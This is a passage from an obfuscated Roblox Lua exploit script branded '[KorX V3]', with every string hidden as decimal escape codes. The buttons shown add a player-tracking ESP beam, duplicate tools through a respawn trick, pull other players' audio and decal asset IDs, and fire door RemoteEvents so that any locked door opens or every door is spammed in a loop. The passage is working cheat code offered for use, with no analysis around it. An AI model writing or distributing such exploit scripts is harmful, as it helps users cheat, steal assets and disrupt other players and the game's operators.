enbjsfar.Position = UDim2.new(0, 0, 1, 0)
enbjsfar.Size = UDim2.new(0, 140, 0, 67)
lqdtenbjs.Name = "\112\108\97\121\101\114"
lqdtenbjs.Parent = enbjsfar
lqdtenbjs.BackgroundColor3 = Color3.new(255, 0, 0)
lqdtenbjs.BorderColor3 = Color3.new(0.34902, 0.34902, 0.34902)
lqdtenbjs.Position = UDim2.new(0.10357143, 0, 0.179104477, 0)
lqdtenbjs.Size = UDim2.new(0, 111, 0, 18)
lqdtenbjs.Font = Enum.Font.SciFi
lqdtenbjs.PlaceholderText = "\80\108\97\121\101\114\32\78\97\109\101"
lqdtenbjs.Text = ""
lqdtenbjs.TextColor3 = Color3.new(0, 0 ,0)
lqdtenbjs.TextSize = 14
dtenbjs.Name = "\99\114\101\97\116\101"
dtenbjs.Parent = enbjsfar
dtenbjs.BackgroundColor3 = Color3.new(94, 96, 126)
dtenbjs.BorderColor3 = Color3.new(0.137255, 0.12549, 0.219608)
dtenbjs.Position = UDim2.new(0.107142858, 0, 0.611940324, 0)
dtenbjs.Size = UDim2.new(0, 111, 0, 18)
dtenbjs.Font = Enum.Font.SciFi
dtenbjs.Text = "\67\114\101\97\116\101\32\69\83\80"
dtenbjs.TextColor3 = Color3.new(0, 0, 0)
dtenbjs.TextSize = 14
qdtenb.Parent = nbjsfa
qdtenb.BackgroundColor3 = Color3.new(1, 1, 1)
qdtenb.BackgroundTransparency = 1
qdtenb.Position = UDim2.new(0, 0, 0.0714285672, 0)
qdtenb.Size = UDim2.new(0, 140, 0, 32)
qdtenb.Font = Enum.Font.SciFi
qdtenb.Text = "\91\75\111\114\88\32\86\51\32\69\83\80\93"
qdtenb.TextColor3 = Color3.new(0, 0, 0)
qdtenb.TextScaled = true
qdtenb.TextSize = 12
qdtenb.TextWrapped = true
dtenbjs.MouseButton1Click:connect(function()
local lqdten = game.Players.LocalPlayer.Name
local klqdten = Instance.new("\66\101\97\109", workspace)
local iklqdte = Instance.new("\65\116\116\97\99\104\109\101\110\116")
local oiklqdt = Instance.new("\65\116\116\97\99\104\109\101\110\116")
iklqdte.Parent = game.Workspace[lqdten].Head
oiklqdt.Parent = game.Workspace[lqdtenbjs.Text].Head
klqdten.Attachment0 = iklqdte
klqdten.Attachment1 = oiklqdt
local _oiklqdte = Color3.new(255, 0, 0)
local m_oiklqdtenb_oiklqdt = Color3.new(255,0 ,0) 
klqdten.Color = ColorSequence.new(_oiklqdte, m_oiklqdtenb_oiklqdt)
klqdten.Width0 = 0.1
klqdten.Width1 = 0.1
local pm_oiklq = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", oiklqdt)
local oiklqdte = Instance.new("\84\101\120\116\76\97\98\101\108", pm_oiklq)
pm_oiklq.AlwaysOnTop = true
pm_oiklq.Size = UDim2.new(0,200,0,50)
oiklqdte.Size = UDim2.new(0,200,0,50)
oiklqdte.BackgroundTransparency = 1
oiklqdte.Text = lqdtenbjs.Text
oiklqdte.TextColor3 = Color3.new(255,0,0)
oiklqdte.Font = Enum.Font.SciFi
oiklqdte.TextStrokeTransparency = 0
oiklqdte.TextScaled = true
end)
end)
ten.Name = "\78\47\65"
ten.Parent = sfa
ten.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ten.BackgroundTransparency = 0.30000001192093
ten.Position = UDim2.new(0.047786735, 0, 0.442731321, 0)
ten.Size = UDim2.new(0, 160, 0, 40)
ten.Font = Enum.Font.Garamond
ten.Text = "\84\72\69\77\69\83"
ten.TextColor3 = Color3.new(0, 0, 0)
ten.TextSize = 14
ten.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
end)
ten_2.Name = "\78\47\65"
ten_2.Parent = sfa
ten_2.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ten_2.BackgroundTransparency = 0.30000001192093
ten_2.Position = UDim2.new(0.047786735, 0, 0.577562809, 0)
ten_2.Size = UDim2.new(0, 160, 0, 40)
ten_2.Font = Enum.Font.Garamond
ten_2.Text = "\67\76\79\78\69\32\73\84\69\77\83"
ten_2.TextColor3 = Color3.new(0, 0, 0)
ten_2.TextSize = 14
ten_2.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\67\108\111\110\101\32\73\116\101\109\115\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
game.Players.LocalPlayer.Character.Humanoid.Health = 0
game.Players.LocalPlayer.CharacterAdded:connect(function()
for _,klqdte in pairs(game.Players.LocalPlayer:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) then
klqdte.Parent = game.Players.LocalPlayer.Backpack
end
end
wait()
game.Players.LocalPlayer.Character.Humanoid.Died:connect(function()
for _,klqdte in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if (klqdte:IsA("\84\111\111\108")) then
klqdte.Parent = game.Players.LocalPlayer
end
end
end)
end)
end)
ten_3.Name = "\78\47\65"
ten_3.Parent = sfa
ten_3.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ten_3.BackgroundTransparency = 0.30000001192093
ten_3.Position = UDim2.new(0.047786735, 0, 0.718012214, 0)
ten_3.Size = UDim2.new(0, 160, 0, 40)
ten_3.Font = Enum.Font.Garamond
ten_3.Text = "\65\85\68\73\79\32\65\78\68\32\68\69\67\65\76\32\83\84\69\65\76\69\82"
ten_3.TextColor3 = Color3.new(0, 0, 0)
ten_3.TextSize = 14
ten_3.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\65\117\100\105\111\32\97\110\100\32\68\101\99\97\108\32\115\116\101\97\108\101\114\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
local farcgpm_ = Instance.new("\83\99\114\101\101\110\71\117\105")
local sfarcgp = Instance.new("\70\114\97\109\101")
local _oiklqdten = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local bjs = Instance.new("\84\101\120\116\66\111\120")
local nbjsfar = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local enbjsfarc = Instance.new("\84\101\120\116\66\111\120")
local tenbjsf = Instance.new("\84\101\120\116\76\97\98\101\108")
local dtenbjsf = Instance.new("\84\101\120\116\76\97\98\101\108")
local qdtenbj = Instance.new("\84\101\120\116\76\97\98\101\108")
local lqdtenb = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local klqdtenb = Instance.new("\84\101\120\116\66\117\116\116\111\110")
local iklqdten = Instance.new("\84\101\120\116\66\117\116\116\111\110")
farcgpm_.Name = "\66\121\112\97\115\115\101\100\32\86\49"
farcgpm_.Parent = game.CoreGui
sfarcgp.Name = "\66\121\112\97\115\115\101\115"
sfarcgp.Parent = farcgpm_
sfarcgp.Active = true
sfarcgp.BackgroundColor3 = Color3.new(0, 0, 0)
sfarcgp.BackgroundTransparency = 0.5
sfarcgp.Draggable = true
sfarcgp.Position = UDim2.new(0.0209713019, 0, 0.48756218, 0)
sfarcgp.Size = UDim2.new(0, 144, 0, 187)
_oiklqdten.Name = "\68\101\99\97\108"
_oiklqdten.Parent = sfarcgp
_oiklqdten.BackgroundColor3 = Color3.new(0.784314, 0, 0.0117647)
_oiklqdten.Position = UDim2.new(0.128748149, 0, 0.716431201, 0)
_oiklqdten.Size = UDim2.new(0, 106, 0, 20)
_oiklqdten.Font = Enum.Font.Garamond
_oiklqdten.Text = "\83\116\101\97\108\32\68\101\99\97\108\32\73\68"
_oiklqdten.TextSize = 14
_oiklqdten.MouseButton1Click:connect(function()
    local oiklqdte = bjs.Text
    local _oiklqdten = game.Workspace:FindFirstChild(oiklqdte .. "\83\112\114\97\121").Decal.Texture
    print(_oiklqdten)
end)
bjs.Name = "\68\101\99\97\108\80\108\97\121\101\114"
bjs.Parent = _oiklqdten
bjs.BackgroundColor3 = Color3.new(1, 1, 1)
bjs.Position = UDim2.new(0, 0, -1.25, 0)
bjs.Size = UDim2.new(0, 106, 0, 14)
bjs.Font = Enum.Font.SourceSans
bjs.Text = ""
bjs.TextSize = 14
nbjsfar.Name = "\65\117\100\105\111"
nbjsfar.Parent = sfarcgp
nbjsfar.BackgroundColor3 = Color3.new(0.784314, 0, 0.0117647)
nbjsfar.Position = UDim2.new(0.128748149, 0, 0.404634595, 0)
nbjsfar.Size = UDim2.new(0, 106, 0, 20)
nbjsfar.Font = Enum.Font.Garamond
nbjsfar.Text = "\83\116\101\97\108\32\65\117\100\105\111\32\73\68"
nbjsfar.TextSize = 14
nbjsfar.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\80\114\101\115\115\32\70\57\32\116\111\32\118\105\101\119\32\73\68\46";
})
    local m_oiklqdte = game.Workspace[enbjsfarc.Text].Torso.Song.SoundId
    print(m_oiklqdte)
end)
enbjsfarc.Name = "\65\117\100\105\111\80\108\97\121\101\114"
enbjsfarc.Parent = nbjsfar
enbjsfarc.BackgroundColor3 = Color3.new(1, 1, 1)
enbjsfarc.Position = UDim2.new(0, 0, -1.25, 0)
enbjsfarc.Size = UDim2.new(0, 106, 0, 14)
enbjsfarc.Font = Enum.Font.SourceSans
enbjsfarc.Text = ""
enbjsfarc.TextSize = 14
tenbjsf.Name = "\66\121\112\97\115\115\101\100"
tenbjsf.Parent = sfarcgp
tenbjsf.TextScaled = true
tenbjsf.BackgroundColor3 = Color3.new(1, 1, 1)
tenbjsf.BackgroundTransparency = 1
tenbjsf.Position = UDim2.new(0.0416666716, 0, 0, 0)
tenbjsf.Size = UDim2.new(0, 138, 0, 57)
tenbjsf.Font = Enum.Font.SciFi
tenbjsf.Text = "\91\75\111\114\88\32\86\51\93"
tenbjsf.TextColor3 = Color3.new(1, 0, 0)
tenbjsf.TextSize = 14
lqdtenb.Name = "\67\114\111\115\115"
lqdtenb.Parent = sfarcgp
lqdtenb.BackgroundColor3 = Color3.new(0.784314, 0, 0.0117647)
lqdtenb.BackgroundTransparency = 0.5
lqdtenb.Position = UDim2.new(0.8125, 0, 0, 0)
lqdtenb.Size = UDim2.new(0, 27, 0, 19)
lqdtenb.Font = Enum.Font.Garamond
lqdtenb.Text = "\88"
lqdtenb.TextSize = 16
lqdtenb.MouseButton1Click:connect(function()
    sfarcgp.Visible = false
    iklqdten.Visible = false
end)
klqdtenb.Name = "\77\105\110\105\109\105\122\101"
klqdtenb.Parent = sfarcgp
klqdtenb.BackgroundColor3 = Color3.new(0.784314, 0, 0.0117647)
klqdtenb.BackgroundTransparency = 0.5
klqdtenb.Position = UDim2.new(0.625, 0, 0, 0)
klqdtenb.Size = UDim2.new(0, 27, 0, 19)
klqdtenb.Font = Enum.Font.SciFi
klqdtenb.Text = "\45"
klqdtenb.TextSize = 16
klqdtenb.MouseButton1Down:connect(function()
    sfarcgp.Visible = false
    iklqdten.Visible = true
end)
iklqdten.Name = "\79\112\101\110"
iklqdten.Parent = farcgpm_
iklqdten.BackgroundColor3 = Color3.new(1.17647, 0, 0.0117647)
iklqdten.BackgroundTransparency = 0.40000000596046
iklqdten.BorderSizePixel = 0
iklqdten.Position = UDim2.new(0, 0, 0.726368189, 0)
iklqdten.Size = UDim2.new(0, 38, 0, 56)
iklqdten.Font = Enum.Font.SourceSans
iklqdten.Text = "\79\112\101\110"
iklqdten.TextSize = 14
iklqdten.MouseButton1Down:connect(function()
    iklqdten.Visible = false
    sfarcgp.Visible = true
end)
if iklqdten.Visible == true then
    sfarcgp.Visible = false
end
end)
ten_4.Name = "\78\47\65"
ten_4.Parent = sfa
ten_4.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
ten_4.BackgroundTransparency = 0.30000001192093
ten_4.Position = UDim2.new(0.047786735, 0, 0.858461618, 0)
ten_4.Size = UDim2.new(0, 160, 0, 40)
ten_4.Font = Enum.Font.Garamond
ten_4.Text = "\68\79\79\82\32\85\78\76\79\67\75"
ten_4.TextColor3 = Color3.new(0, 0, 0)
ten_4.TextSize = 14
ten_4.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\68\111\111\114\32\117\110\108\111\99\107\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\59\32\121\111\117\32\109\97\121\32\111\112\101\110\32\97\110\121\32\108\111\99\107\101\100\32\100\111\111\114\115\46";
})
klqdtenbjs = game.Players.LocalPlayer:getMouse()
toggled = true
klqdtenbjs.KeyDown:connect(function(e)
if e:lower() == "\109\110" then
toggled = not toggled
print("\116\111\103\103\108\101\58\32" .. tostring(toggled))
end
end)
klqdtenbjs.Button1Down:connect(function()
if toggled == true then
if klqdtenbjs.Target ~= nil then
if klqdtenbjs.Target.Name == "\67\108\105\99\107" then
local gpm_oiklq, b = pcall(function()
if klqdtenbjs.Target.Parent:findFirstChild("\76\111\99\107\101\114") then
if klqdtenbjs.Target.Parent:findFirstChild("\76\111\99\107\101\114").className == "\66\111\111\108\86\97\108\117\101" then
if klqdtenbjs.Target.Parent:findFirstChild("\76\111\99\107\101\114").Value == true then
klqdtenbjs.Target.Parent.Lock.ClickDetector.RemoteEvent:FireServer()
wait(.1)
klqdtenbjs.Target.ClickDetector.RemoteEvent:FireServer()
else
warn("\100\111\111\114\32\105\115\32\117\110\108\111\99\107\101\100\32\40\108\111\108\41")
end
end
end
end)
if not gpm_oiklq then
warn(b)
end
end
end
end
end)
end)
ten_4.MouseButton2Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\68\111\111\114\32\83\112\97\109\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
function m(p)
    for i,klqdte in pairs(p:children()) do
        if klqdte.Name == "\68\111\111\114" then
            spawn(function()
                while wait() do
                    klqdte.Lock.ClickDetector.RemoteEvent:FireServer(true)
                    klqdte.Click.ClickDetector.RemoteEvent:FireServer(true)
                end
            end)
        end
        m(klqdte)
    end
end
m(workspace)
end)
klq.Name = "\65\110\105\109\97\116\105\111\110\115\32\77\101\110\117"
klq.Parent = arc
klq.BackgroundColor3 = Color3.new(1, 1, 1)
klq.BackgroundTransparency = 0.60000002384186
klq.Position = UDim2.new(0.601832986, 0, 0.0399999991, 0)
klq.Size = UDim2.new(0, 177, 0, 503)
ikl.Name = "\66\111\111\109\98\111\120"
ikl.Parent = klq
ikl.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
ikl.BackgroundTransparency = 0.5
ikl.Position = UDim2.new(0.047786735, 0, 0.0304589141, 0)
ikl.Size = UDim2.new(0, 160, 0, 34)
oikl.Parent = ikl
oikl.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
oikl.BackgroundTransparency = 0.5
oikl.Position = UDim2.new(0, 0, 7.4505806e-08, 0)
oikl.Size = UDim2.new(0, 160, 0, 34)
oikl.Font = Enum.Font.Garamond
oikl.Text = "\91\65\110\105\109\97\116\105\111\110\115\93"
oikl.TextColor3 = Color3.new(0, 0, 0)
oikl.TextScaled = true
oikl.TextSize = 14
oikl.TextWrapped = true
_oik.Name = "\70\76\79\65\84"
_oik.Parent = klq
_oik.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
_oik.BackgroundTransparency = 0.30000001192093
_oik.Position = UDim2.new(0.047786735, 0, 0.131212831, 0)
_oik.Size = UDim2.new(0, 160, 0, 40)
_oik.Font = Enum.Font.Garamond
_oik.Text = "\70\76\79\65\84"
_oik.TextColor3 = Color3.new(0, 0, 0)
_oik.TextSize = 14
_oik.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\70\108\111\97\116\105\110\103\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId="\114\98\120\97\115\115\101\116\105\100\58\47\47\52\53\49\54\56\55\48\53\55"
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.jump:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://451686028'
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.idle:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://451686028'
end
end
end)
m_oik.Name = "\78\73\78\70\76\73\80"
m_oik.Parent = klq
m_oik.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
m_oik.BackgroundTransparency = 0.30000001192093
m_oik.Position = UDim2.new(0.047786735, 0, 0.224652171, 0)
m_oik.Size = UDim2.new(0, 160, 0, 40)
m_oik.Font = Enum.Font.Garamond
m_oik.Text = "\78\73\78\70\76\73\80\32\79\78\76\89"
m_oik.TextColor3 = Color3.new(0, 0, 0)
m_oik.TextSize = 14
m_oik.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\78\105\110\106\97\32\70\108\105\112\32\106\117\109\112\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.jump:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://229782914'
end
    end)
pm_oi.Name = "\78\73\78\74\65"
pm_oi.Parent = klq
pm_oi.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
pm_oi.BackgroundTransparency = 0.30000001192093
pm_oi.Position = UDim2.new(0.047786735, 0, 0.320079595, 0)
pm_oi.Size = UDim2.new(0, 160, 0, 40)
pm_oi.Font = Enum.Font.Garamond
pm_oi.Text = "\70\85\76\76\32\78\73\78\74\65"
pm_oi.TextColor3 = Color3.new(0, 0, 0)
pm_oi.TextSize = 14
pm_oi.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\78\105\110\106\97\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId="\114\98\120\97\115\115\101\116\105\100\58\47\47\50\50\57\55\55\49\52\56\52"
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.jump:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://229782914'
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.idle:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://255771113'
end
end
end)
gpm_o.Name = "\74\85\77\80\76\65\78\68"
gpm_o.Parent = klq
gpm_o.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
gpm_o.BackgroundTransparency = 0.30000001192093
gpm_o.Position = UDim2.new(0.047786735, 0, 0.415507048, 0)
gpm_o.Size = UDim2.new(0, 160, 0, 40)
gpm_o.Font = Enum.Font.Garamond
gpm_o.Text = "\74\85\77\80\32\76\65\78\68"
gpm_o.TextColor3 = Color3.new(0, 0, 0)
gpm_o.TextSize = 14
gpm_o.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\74\117\109\112\45\108\97\110\100\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
AnimationId = "\49\56\52\53\55\52\51\52\48"
local farcgpm_oi = Instance.new("\65\110\105\109\97\116\105\111\110")
farcgpm_oi.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(farcgpm_oi)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
cgpm_.Name = "\68\65\78\67\69"
cgpm_.Parent = klq
cgpm_.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
cgpm_.BackgroundTransparency = 0.30000001192093
cgpm_.Position = UDim2.new(0.047786735, 0, 0.510934472, 0)
cgpm_.Size = UDim2.new(0, 160, 0, 40)
cgpm_.Font = Enum.Font.Garamond
cgpm_.Text = "\68\65\78\67\69"
cgpm_.TextColor3 = Color3.new(0, 0, 0)
cgpm_.TextSize = 14
cgpm_.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\68\97\110\99\105\110\103\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
AnimationId0 = "\52\50\57\55\48\51\55\51\52"
local nbjsfarc = Instance.new("\65\110\105\109\97\116\105\111\110")
nbjsfarc.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId0
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(nbjsfarc)
nbjsfarcg:Play()
nbjsfarcg:AdjustSpeed(1)
end)
rcgpm.Name = "\68\79\71\87\65\76\75"
rcgpm.Parent = klq
rcgpm.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
rcgpm.BackgroundTransparency = 0.30000001192093
rcgpm.Position = UDim2.new(0.047786735, 0, 0.606361926, 0)
rcgpm.Size = UDim2.new(0, 160, 0, 40)
rcgpm.Font = Enum.Font.Garamond
rcgpm.Text = "\68\79\71\47\67\65\84\32\87\65\76\75"
rcgpm.TextColor3 = Color3.new(0, 0, 0)
rcgpm.TextSize = 14
rcgpm.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
for _,klqdte in pairs(game.Players.LocalPlayer.Character.Animate.walk:GetChildren()) do
    klqdte.AnimationId = 'rbxassetid://948444869'
end
end)
AnimationId3 = "\51\53\49\53\52\57\54\49"
local dtenbjsfa = Instance.new("\65\110\105\109\97\116\105\111\110")
arcgp.Name = "\72\69\65\68\84\72\82\79\87"
arcgp.Parent = klq
arcgp.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
arcgp.BackgroundTransparency = 0.30000001192093
arcgp.Position = UDim2.new(0.047786735, 0, 0.703777432, 0)
arcgp.Size = UDim2.new(0, 160, 0, 40)
arcgp.Font = Enum.Font.Garamond
arcgp.Text = "\72\69\65\68\32\84\72\82\79\87"
arcgp.TextColor3 = Color3.new(0, 0, 0)
arcgp.TextSize = 14
arcgp.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\72\101\97\100\116\104\114\111\119\32\97\110\105\109\97\116\105\111\110\32\104\97\115\32\98\101\101\110\32\115\101\108\101\99\116\101\100\46";
})
dtenbjsfa.AnimationId = "\114\98\120\97\115\115\101\116\105\100\58\47\47"..AnimationId3
local nbjsfarcg = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(dtenbjsfa)
nbjsfarcg:Play(0)
nbjsfarcg:AdjustSpeed(1)
end)
AnimationId = "\49\56\56\54\51\50\48\49\49"
local farcgpm_oi = Instance.new("\65\110\105\109\97\116\105\111\110")
farcg.Name = "\83\80\73\78"
farcg.Parent = klq
farcg.BackgroundColor3 = Color3.new(0.368627, 0.376471, 0.494118)
farcg.BackgroundTransparency = 0.30000001192093
farcg.Position = UDim2.new(0.047786735, 0, 0.801192939, 0)
farcg.Size = UDim2.new(0, 160, 0, 40)
farcg.Font = Enum.Font.Garamond
farcg.Text = "\83\80\73\78"
farcg.TextColor3 = Color3.new(0, 0, 0)
farcg.TextSize = 14
farcg.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
